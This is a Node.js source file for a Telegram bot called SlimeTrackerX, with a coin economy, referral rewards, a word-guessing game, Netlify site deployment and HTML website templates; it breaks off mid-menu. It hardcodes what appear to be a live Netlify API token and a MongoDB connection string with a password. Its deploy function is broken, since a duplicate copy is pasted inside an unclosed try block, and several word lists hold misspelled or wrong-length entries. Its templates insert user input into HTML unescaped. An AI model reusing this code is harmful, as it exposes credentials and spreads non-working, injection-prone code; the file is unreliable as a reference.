// =====================================================
// 🎮🔥 SLIME TRACKERX v40.0 - ULTIMATE EDITION 🔥🎮
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const archiver = require("archiver");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== NETLIFY TOKEN ==========
const NETLIFY_TOKEN = "nfp_ZpWdTYcEPVJpQisJ9vd54r93cKsJGeLJ4a65";
const NETLIFY_API = "https://api.netlify.com/api/v1";

// ========== BOT CONFIG ==========
const DOMAIN = "https://virtualnumbersfree.onrender.com";
const CHANNEL = "@devxtechzone";
const OWNER_ID = 7271063368;

// ========== ECONOMY ==========
const WEB_PRICE = 15;
const TRACK_COST = 15;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 10;
const WORK_REWARD = 5;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;

// ========== WORD DIFFICULTY ==========
const difficulties = {
  easy: { name: "🍃 EASY", timer: 45, letters: 3, multiplier: 1 },
  medium: { name: "⚡ MEDIUM", timer: 30, letters: 5, multiplier: 2 },
  hard: { name: "🔥 HARD", timer: 15, letters: 7, multiplier: 3 },
  expert: { name: "💀 EXPERT", timer: 8, letters: 9, multiplier: 5 }
};

// ========== WORD DATABASE (100+ words each) ==========
const wordsByLength = {
  3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "BIG", "NEW", "OLD", "FUN", "RUN", "SIT", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "RAT", "BAT", "MAT", "PAT", "SAT", "HEN", "PEN", "DEN", "MEN", "TEN", "NET", "PET", "GET", "JET", "SET", "BET", "LET", "MET", "YET", "ZIP", "LIP", "TIP", "HIP", "DIP", "RIP", "SIP", "NIP", "MAP", "CAP", "TAP", "GAP", "LAP", "SAP", "NAP", "VAN", "MAN", "CAN", "PAN", "FAN", "BAN", "RAN", "WAN", "HIT", "KIT", "BIT", "FIT", "PIT", "WIT", "ROW", "COW", "HOW", "NOW", "LOW", "BOW", "TOW", "TOY", "BOY", "DAY", "WAY", "PAY", "SAY", "KEY", "HEY", "ICE", "ACE", "AGE", "ARE", "AND", "END", "INK", "OWL", "EAR", "ARM", "ANT", "WEB", "LAB", "CAB", "JAB", "TUB", "SUB", "RUB", "CUB", "PUB", "HUB"],
  4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "WIND", "FIRE", "ROCK", "SAND", "SHIP", "KING", "RING", "SING", "WING", "BOOK", "COOK", "LOOK", "LION", "BEAR", "WOLF", "DEER", "GOAT", "DUCK", "SWAN", "SEAL", "ROAD", "PATH", "WALL", "DOOR", "ROOF", "ROOM", "HALL", "YARD", "GATE", "FARM", "BLUE", "PINK", "GRAY", "GOLD", "SILK", "WOOL", "CASH", "COIN", "NOTE", "BANK", "TIME", "YEAR", "WEEK", "HOUR", "MATH", "CODE", "DATA", "FILE", "FORM", "PLAY", "GAME", "TEAM", "GOAL", "PASS", "KICK", "RACE", "JUMP", "DIVE", "SWIM", "FOOD", "RICE", "MEAT", "CAKE", "SOUP", "EGGS", "SALT", "SPIN", "RAIN", "SNOW", "HEAT", "COLD", "MIST", "FOG", "HAIL", "CLAY", "HAND", "HEAD", "FOOT", "NOSE", "MOUTH", "TEETH", "HAIR", "BELL", "FORK", "SPOON", "KNIFE", "PLATE", "BOWL", "CUPID", "ANGEL", "DEVIL", "GHOST", "SPIRIT", "SOUL", "HEART", "BRAIN", "LUNG", "KIDNEY", "LIVER"],
  5: ["APPLE", "MANGO", "GRAPE", "BERRY", "PEACH", "LEMON", "MELON", "GUAVA", "OLIVE", "PLUMS", "HOUSE", "TABLE", "CHAIR", "COUCH", "SHELF", "PLATE", "GLASS", "SPOON", "FORKS", "KNIFE", "HAPPY", "SMART", "BRAVE", "CALM", "KIND", "PROUD", "SHARP", "QUICK", "SWEET", "TOUGH", "LIGHT", "CLEAR", "CLEAN", "DIRTY", "FRESH", "DRIED", "SOFT", "HARD", "BRISK", "SOLID", "WATER", "RIVER", "OCEAN", "LAKES", "BEACH", "SHORE", "WAVES", "TIDES", "DEPTH", "FLOAT", "PLANT", "GRASS", "TREES", "LEAFY", "ROOTS", "BLOOM", "FRUIT", "SEEDS", "GREEN", "GROWN", "MONEY", "VALUE", "PRICE", "COSTS", "SPEND", "SAVES", "LOANS", "TRADE", "STOCK", "BANKS", "POWER", "FORCE", "SPEED", "MOTOR", "DRIVE", "WHEEL", "TRACK", "ROUTE", "PATHS", "WORLD", "EARTH", "SPACE", "STARS", "PLANE", "ROBOT", "DRONE", "ORBIT", "SOLAR", "PEACE", "UNITY", "HUMAN", "HEART", "BRAIN", "MUSIC", "DANCE", "COLOR", "BLACK", "WHITE", "BROWN", "GREEN", "YELLOW", "PURPLE", "ORANGE", "SILVER", "GOLDEN", "BRONZE", "COPPER", "MARBLE", "IVORY"],
  6: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "BRONZE", "COPPER", "MARBLE", "IVORY", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "HORSE", "CATTLE", "SHEEP", "GOAT", "CHICK", "DUCK", "TURKEY", "PIGEON", "CROWD", "SPARROW", "BUTTER", "CHEESE", "BREAD", "SUGAR", "SALT", "PEPPER", "HONEY", "MILK", "COFFEE", "TEA", "JUICE", "WATER", "DRINK", "SMOOTH", "BITTER", "SWEET", "FLAVOR", "TASTE", "DINNER", "LUNCH", "GARDEN", "PALACE", "CASTLE", "TEMPLE", "CHURCH", "MOSQUE", "SCHOOL", "COLLEGE", "OFFICE", "MARKET", "STREET", "AVENUE", "HIGHWAY", "BRIDGE", "TUNNEL", "STATION", "AIRPORT", "HARBOR", "CENTER", "PLAZA", "PLAYER", "DRIVER", "WRITER", "READER", "SINGER", "DANCER", "ACTOR", "MAKER", "CREATE", "DESIGN", "CODING", "DEBUG", "SYSTEM", "SERVER", "CLIENT", "NETWORK", "SECURE", "ACCESS", "MEMORY", "STORED", "FUTURE", "PAST", "PRESENT", "HISTORY", "SCIENCE", "ART", "MUSIC", "DANCE", "SPORT", "GAME", "FUN", "JOY", "LOVE", "HATE", "FEAR", "HOPE", "DREAM", "GOAL", "SUCCESS", "FAILURE", "PROGRESS", "CHANGE", "GROWTH"],
  7: ["ANIMALS", "FARMERS", "HUNTERS", "FISHERS", "DRIVERS", "PLAYERS", "WRITERS", "READERS", "SINGERS", "DANCERS", "TEACHER", "STUDENT", "DOCTORS", "LAWYERS", "BANKERS", "WORKERS", "LEADERS", "MANAGER", "OFFICER", "AGENTS", "FREEDOM", "JUSTICE", "COURAGE", "LOYALTY", "HONESTY", "KINDNESS", "HAPPILY", "SADNESS", "MADNESS", "GOODMAN", "NETWORK", "SYSTEMS", "PROGRAM", "CODINGS", "DEBUGGS", "SERVERS", "CLIENTS", "SECURES", "STORAGE", "PROCESS", "COUNTRY", "VILLAGE", "CITIES", "MARKETS", "SHOPS", "MALLS", "STORES", "HOUSES", "BUILDNG", "FASHION", "CLOTHES", "SHIRTS", "TROUSER", "JACKETS", "SHOES", "SANDALS", "HATS", "BELTS", "WATCHES", "WEATHER", "RAINING", "SNOWING", "SUNRISE", "SUNSETS", "STORMS", "THUNDER", "BREEZES", "CLIMATE", "SEASONS", "ANCIENT", "MODERNS", "FUTURES", "HISTORY", "BIOLOGY", "PHYSICS", "CHEMIST", "MATHS", "LOGICAL", "NATURAL", "SOCIAL", "CULTURE", "LANGUAGE", "ENGLISH", "SPANISH", "FRENCH", "GERMAN", "ITALIAN", "RUSSIAN", "CHINESE", "JAPANESE", "KOREAN", "ARABIC", "HINDI", "BENGALI", "PORTUGUESE", "DUTCH", "POLISH", "TURKISH", "VIETNAMESE", "THAI"],
  8: ["ELEPHANT", "GIRAFFES", "KANGAROO", "DOLPHINS", "PENGUINS", "COMPUTER", "KEYBOARD", "MONITOR", "PRINTER", "SCANNER", "ROUTERS", "NETWORKS", "DATABASE", "SOFTWARE", "HARDWARE", "SECURITY", "FIREWALL", "INTERNET", "BROWSERS", "PROGRAMS", "BEAUTIFUL", "WONDERFUL", "EXCITING", "ADVENTURE", "MYSTERY", "JOURNEY", "DISCOVER", "EXPLORE", "CHALLENGE", "VICTORY", "STRENGTH", "COURAGES", "FRIENDSH", "HAPPINES", "POWERFUL", "CREATIVE", "THINKING", "LEARNING", "TEACHING", "BUILDING", "PLANNING", "STRATEGY", "BUSINESS", "MARKETING", "FINANCES", "ECONOMY", "INDUSTRY", "COMPANYS", "PRODUCTS", "SERVICES", "CUSTOMER", "SUPPORTS", "DELIVERY", "LOGISTICS", "MANAGERS", "LEADERSH", "TEAMWORK", "SUCCESSS", "FAILURES", "PROGRESS", "MOTIVATION", "INSPIRATION", "CREATIVITY", "INNOVATION", "TECHNOLOGY", "EDUCATION", "KNOWLEDGE", "WISDOM", "INTELLIGENT", "BRILLIANT", "EXCELLENT", "OUTSTANDING", "REMARKABLE", "EXTRAODINARY", "PHENOMENAL", "SPECTACULAR", "MAGNIFICENT", "FANTASTIC", "INCREDIBLE", "UNBELIEVABLE", "ASTONISHING", "AMAZING", "AWESOME", "FABULOUS", "MARVELOUS", "TERRIFIC", "WONDERFUL", "SUPERB", "SUPREME", "ULTIMATE", "PERFECT", "IDEAL", "FLAWLESS", "IMMACULATE", "PRISTINE", "SPOTLESS"],
  9: ["INCREDIBLE", "IMPORTANT", "DIFFERENT", "INTERESTS", "KNOWLEDGE", "EDUCATION", "DEVELOPER", "HAPPINESS", "BEAUTIFUL", "POWERFULL", "CREATIVES", "STRONGEST", "BRIGHTEST", "COMPUTERS", "PROGRAMER", "SOFTWARES", "DATABASES", "NETWORKED", "SECURITYS", "FIREWALLS", "INTERNETS", "BROWSINGS", "MARKETING", "FINANCIAL", "BUSINESSS", "INDUSTRYS", "COMPANIES", "PRODUCTLY", "SERVICESS", "CUSTOMERS", "SUPPORTLY", "DELIVERYS", "LOGISTICS", "MANAGEMENT", "LEADERSHP", "TEAMWORKS", "SUCCESSES", "FAILURES", "PROGRESSES", "STRATEGYS", "OPERATIONS", "PLANNINGS", "TECHNOLOGY", "INNOVATION", "CREATIVITY", "MOTIVATION", "INSPIRATION", "DETERMINED", "PASSIONATE", "DISCIPLINE", "COMMITMENT", "EXCELLENCE", "QUALITY", "INTEGRITY", "AUTHENTIC", "GENUINE", "HONESTY", "RESPECT", "VALUE", "PURPOSE", "VISION", "MISSION", "STRATEGIC", "ANALYTICAL", "SYSTEMATIC", "METHODICAL", "ORGANIZED", "EFFICIENT", "EFFECTIVE", "DYNAMIC", "ENERGETIC", "ENTHUSIASTIC", "MOTIVATED", "INSPIRED", "CREATIVE", "INNOVATIVE", "RESOURCEFUL", "INGENIOUS", "INVENTIVE", "ORIGINAL", "UNIQUE", "DISTINCT", "SPECIAL", "EXTRAORDINARY", "REMARKABLE", "EXCEPTIONAL", "PHENOMENAL", "SPECTACULAR", "MAGNIFICENT", "FANTASTIC", "TERRIFIC", "WONDERFUL", "MARVELOUS", "SUPERB", "SUPREME", "ULTIMATE", "PERFECT", "IDEAL"]
};

// ========== FILE SETUP ==========
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

fs.ensureDirSync("uploads");
fs.ensureDirSync("exports");
fs.ensureDirSync("public");

// ========== MONGODB ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Error:', err));

// ========== SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true },
  coins: { type: Number, default: 15 },
  diamonds: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  hacks: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false },
  badges: { type: [String], default: ["🎁 Newbie"] },
  lastActive: { type: Date, default: Date.now }
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  url: String,
  netlifyId: String,
  views: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);

// ========== CACHE ==========
let usersCache = new Map();
let codesCache = new Map();
let webBuilds = new Map();
let bannedUsers = new Set();
let workCD = new Map();
let wordChallenges = new Map();
let hackTokens = new Map();
let processedMessages = new Set();

// ========== DATABASE FUNCTIONS ==========
async function loadData() {
  const users = await User.find({});
  users.forEach(u => usersCache.set(u.userId, u));
  const codes = await Code.find({ expire: { $gt: new Date() } });
  codes.forEach(c => codesCache.set(c.code, c));
  console.log(`📂 Loaded ${usersCache.size} users, ${codesCache.size} codes`);
}

async function saveUser(userId, data) {
  await User.findOneAndUpdate({ userId }, data, { upsert: true });
  usersCache.set(userId, data);
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    user = {
      userId,
      coins: NEW_COINS,
      diamonds: 0,
      referrals: 0,
      referrer: referrerId,
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      wins: 0,
      losses: 0,
      wordWins: 0,
      wordLosses: 0,
      hacks: 0,
      websites: [],
      isAdmin: userId === OWNER_ID,
      badges: ["🎁 Newbie"],
      lastActive: new Date()
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals++;
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 New Referral! +${REF_REWARD} coins`);
      }
    }
  }
  return user;
}

async function addCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level++;
      let reward = user.level * 5;
      user.coins += reward;
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, `🎉 LEVEL UP! Level ${user.level}! +${reward} COINS`);
    } else {
      await saveUser(userId, user);
    }
  }
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'SlimeTrackerXBot'}?start=ref_${id}`;
}

async function checkJoin(ctx) {
  try {
    let m = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    return ["creator", "administrator", "member"].includes(m.status);
  } catch {
    return false;
  }
}

// ========== REDEEM CODE ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code, coins, diamonds,
    usedBy: [],
    maxUses: uses,
    left: uses,
    expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  let c = codesCache.get(code.toUpperCase());
  if (!c) return { ok: false, msg: "❌ Invalid code!" };
  if (Date.now() > c.expire) return { ok: false, msg: "❌ Code expired!" };
  if (c.left <= 0) return { ok: false, msg: "❌ Code used up!" };
  if (c.usedBy.includes(userId)) return { ok: false, msg: "❌ Already used!" };
  
  await addCoin(userId, c.coins);
  if (c.diamonds > 0) {
    let user = usersCache.get(userId);
    user.diamonds += c.diamonds;
    await saveUser(userId, user);
  }
  
  c.usedBy.push(userId);
  c.left--;
  await c.save();
  codesCache.set(c.code, c);
  
  return { ok: true, msg: `✅ +${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}` };
}

// ========== NETLIFY DEPLOY ==========
// ========== WORKING NETLIFY DEPLOY ==========
async function deployToNetlify(htmlContent, siteName) {
  try {
    // Generate unique site name (prevents conflicts)
    const timestamp = Date.now();
    const randomId = Math.random().toString(36).substring(2, 8);
    let cleanName = siteName
      .toLowerCase()
      .replace(/[^a-z0-9]/g, '-')
      .replace(/-+/g, '-')
      .replace(/^-|-$/g, '')
      .substring(0, 15);
    
    if (!cleanName || cleanName.length < 3) {
      cleanName = `my-site`;
    }
    
    const finalSiteName = `${cleanName}-${timestamp}-${randomId}`;
    
    console.log(`🚀 Deploying: ${finalSiteName}`);
    
    // Create temp directory
    const tempDir = path.join(__dirname, "exports", finalSiteName);
    await fs.ensureDir(tempDir);
    
    // Write index.html
    await fs.writeFile(path.join(tempDir, "index.html"), htmlContent);
    
    // Create zip file
    const zipPath = path.join(__dirname, "exports", `${finalSiteName}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver("zip", { zlib: { level: 9 } });
    
    await new Promise((resolve, reject) => {
      output.on("close", resolve);
      archive.on("error", reject);
      archive.pipe(output);
      archive.directory(tempDir, false);
      archive.finalize();
    });
    
    // Deploy to netlify
    // ========== NETLIFY DEPLOY - NO FALLBACK ==========
// ========== NETLIFY DEPLOY - NO FALLBACK ==========
async function deployToNetlify(htmlContent, siteName) {
  // Generate unique site name
  const timestamp = Date.now();
  const randomId = Math.random().toString(36).substring(2, 8);
  let cleanName = siteName
    .toLowerCase()
    .replace(/[^a-z0-9]/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-|-$/g, '')
    .substring(0, 15);
  
  if (!cleanName || cleanName.length < 3) {
    cleanName = `site`;
  }
  
  const finalSiteName = `${cleanName}-${timestamp}-${randomId}`;
  
  console.log(`🚀 Deploying: ${finalSiteName}`);
  
  // Create temp directory
  const tempDir = path.join(__dirname, "exports", finalSiteName);
  await fs.ensureDir(tempDir);
  await fs.writeFile(path.join(tempDir, "index.html"), htmlContent);
  
  // Create zip file
  const zipPath = path.join(__dirname, "exports", `${finalSiteName}.zip`);
  const output = fs.createWriteStream(zipPath);
  const archive = archiver("zip", { zlib: { level: 9 } });
  
  await new Promise((resolve, reject) => {
    output.on("close", resolve);
    archive.on("error", reject);
    archive.pipe(output);
    archive.directory(tempDir, false);
    archive.finalize();
  });
  
  // Deploy to Netlify
  const formData = new FormData();
  formData.append("file", fs.createReadStream(zipPath));
  
  const response = await axios.post("https://api.netlify.com/api/v1/sites", formData, {
    headers: {
      "Authorization": `Bearer ${NETLIFY_TOKEN}`,
      ...formData.getHeaders()
    },
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    timeout: 60000
  });
  
  console.log(`✅ Deployed: ${response.data.url}`);
  
  // Cleanup
  await fs.remove(tempDir).catch(() => {});
  await fs.remove(zipPath).catch(() => {});
  
  return {
    success: true,
    url: response.data.url,
    siteName: response.data.name
  };
}
// ========== DOPE HTML TEMPLATES ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.name || 'Portfolio'} | Dope Website</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: white;
            line-height: 1.6;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
        }
        .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #FF6B6B, #4ECDC4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .nav-links a { color: #fff; margin-left: 30px; text-decoration: none; transition: 0.3s; }
        .nav-links a:hover { color: #4ECDC4; }
        .hero { text-align: center; padding: 80px 0; }
        .hero h1 { font-size: 56px; margin-bottom: 20px; background: linear-gradient(45deg, #FF6B6B, #4ECDC4, #45B7D1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero p { font-size: 20px; opacity: 0.9; }
        .btn { display: inline-block; background: linear-gradient(45deg, #FF6B6B, #4ECDC4); color: white; padding: 12px 30px; border-radius: 30px; text-decoration: none; font-weight: 600; transition: 0.3s; }
        .btn:hover { transform: translateY(-3px); }
        .section { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px; margin: 40px 0; backdrop-filter: blur(10px); }
        .section h2 { margin-bottom: 20px; font-size: 32px; }
        .skills { display: flex; gap: 15px; flex-wrap: wrap; margin-top: 20px; }
        .skill { background: rgba(255,255,255,0.1); padding: 10px 20px; border-radius: 20px; }
        footer { text-align: center; padding: 40px; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 60px; }
        @media (max-width: 768px) {
            .navbar { flex-direction: column; gap: 20px; }
            .hero h1 { font-size: 32px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="navbar">
            <div class="logo"><i class="fas fa-code"></i> ${data.name || 'Portfolio'}</div>
            <div class="nav-links">
                <a href="#">Home</a>
                <a href="#">About</a>
                <a href="#">Projects</a>
                <a href="#">Contact</a>
            </div>
        </div>
        <div class="hero">
            <h1>${data.name || 'Welcome to My Portfolio'}</h1>
            <p>${data.title || 'Creative Developer & Designer'}</p>
            <a href="#" class="btn">Hire Me</a>
        </div>
        <div class="section">
            <h2>About Me</h2>
            <p>${data.bio || 'Passionate creator building amazing web experiences.'}</p>
            <div class="skills">
                <span class="skill">${data.skill1 || 'JavaScript'}</span>
                <span class="skill">${data.skill2 || 'React'}</span>
                <span class="skill">${data.skill3 || 'Node.js'}</span>
            </div>
        </div>
        <footer>
            <p>📧 ${data.email || 'hello@example.com'}</p>
            <p>© 2024 Built with SlimeTrackerX</p>
        </footer>
    </div>
</body>
</html>`,
  
  business: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.company || 'Business'} | Dope Website</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Poppins', sans-serif; background: #0a0a0a; color: #fff; }
        .navbar { background: rgba(10,10,10,0.95); padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; }
        .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #FFD700, #FF6347); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .nav-links a { color: #fff; text-decoration: none; margin-left: 30px; transition: 0.3s; }
        .nav-links a:hover { color: #FFD700; }
        .hero { background: linear-gradient(135deg, #1a1a2e, #16213e); text-align: center; padding: 120px 20px; }
        .hero h1 { font-size: 56px; margin-bottom: 20px; }
        .btn { background: linear-gradient(45deg, #FFD700, #FF6347); color: #1a1a2e; padding: 15px 40px; border-radius: 40px; text-decoration: none; font-weight: 600; display: inline-block; }
        .container { max-width: 1200px; margin: 0 auto; padding: 80px 20px; }
        .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .service-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 40px; text-align: center; }
        .service-card i { font-size: 50px; color: #FFD700; margin-bottom: 20px; }
        footer { text-align: center; padding: 40px; border-top: 1px solid rgba(255,255,255,0.1); margin-top: 60px; }
        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 20px; } .hero h1 { font-size: 32px; } }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo"><i class="fas fa-chart-line"></i> ${data.company || 'Business'}</div>
        <div class="nav-links">
            <a href="#">Home</a>
            <a href="#">Services</a>
            <a href="#">Contact</a>
        </div>
    </div>
    <div class="hero">
        <h1>${data.company || 'Welcome to Our Business'}</h1>
        <p>${data.tagline || 'Delivering Excellence Since 2024'}</p>
        <a href="#" class="btn">Get Started</a>
    </div>
    <div class="container">
        <h2 style="text-align:center; margin-bottom:50px;">Our Services</h2>
        <div class="services">
            <div class="service-card"><i class="fas fa-rocket"></i><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Cutting-edge solutions'}</p></div>
            <div class="service-card"><i class="fas fa-chart-line"></i><h3>${data.service2 || 'Growth'}</h3><p>${data.service2_desc || 'Strategic planning'}</p></div>
            <div class="service-card"><i class="fas fa-headset"></i><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 customer support'}</p></div>
        </div>
    </div>
    <footer>
        <p>📧 ${data.email || 'info@example.com'} | 📞 ${data.phone || '+1 234 567 8900'}</p>
        <p>📍 ${data.address || '123 Business Street'}</p>
    </footer>
</body>
</html>`,
  
  store: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.store || 'Store'} | Dope Website</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', sans-serif; background: #f8f9fa; }
        .navbar { background: white; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 20px rgba(0,0,0,0.1); }
        .logo { font-size: 28px; font-weight: 800; background: linear-gradient(45deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero { background: linear-gradient(135deg, #667eea, #764ba2); color: white; text-align: center; padding: 80px 20px; }
        .hero h1 { font-size: 48px; margin-bottom: 20px; }
        .products { max-width: 1200px; margin: 60px auto; padding: 0 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .product-card { background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 5px 20px rgba(0,0,0,0.1); transition: 0.3s; }
        .product-card:hover { transform: translateY(-10px); }
        .product-image { height: 200px; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; }
        .product-image i { font-size: 60px; color: white; }
        .product-info { padding: 20px; }
        .product-title { font-size: 20px; font-weight: 600; }
        .product-price { font-size: 24px; font-weight: 800; color: #667eea; margin: 10px 0; }
        .add-to-cart { background: linear-gradient(45deg, #667eea, #764ba2); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: 600; }
        footer { background: #1a1a2e; color: white; text-align: center; padding: 40px; margin-top: 60px; }
        @media (max-width: 768px) { .navbar { flex-direction: column; gap: 20px; } .hero h1 { font-size: 32px; } }
    </style>
</head>
<body>
    <div class="navbar">
        <div class="logo"><i class="fas fa-store"></i> ${data.store || 'Store'}</div>
        <div class="cart-icon"><i class="fas fa-shopping-cart" style="font-size:24px;"></i></div>
    </div>
    <div class="hero">
        <h1>${data.store || 'Welcome to Our Store'}</h1>
        <p>${data.tagline || 'Premium Products at Best Prices'}</p>
    </div>
    <div class="products">
        <div class="product-card">
            <div class="product-image"><i class="fas fa-laptop-code"></i></div>
            <div class="product-info">
                <div class="product-title">${data.product1 || 'Premium Product'}</div>
                <div class="product-price">$${data.product1_price || '49'}</div>
                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart</button>
            </div>
        </div>
        <div class="product-card">
            <div class="product-image"><i class="fas fa-mobile-alt"></i></div>
            <div class="product-info">
                <div class="product-title">${data.product2 || 'Featured Item'}</div>
                <div class="product-price">$${data.product2_price || '79'}</div>
                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart</button>
            </div>
        </div>
        <div class="product-card">
            <div class="product-image"><i class="fas fa-crown"></i></div>
            <div class="product-info">
                <div class="product-title">${data.product3 || 'Deluxe Edition'}</div>
                <div class="product-price">$${data.product3_price || '99'}</div>
                <button class="add-to-cart" onclick="alert('Added to cart!')">Add to Cart</button>
            </div>
        </div>
    </div>
    <footer>
        <p>📧 ${data.email || 'store@example.com'}</p>
        <p>🔥 Built with SlimeTrackerX Store Builder</p>
    </footer>
</body>
</html>`
};

// ========== MAIN MENU ==========
function getMainMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
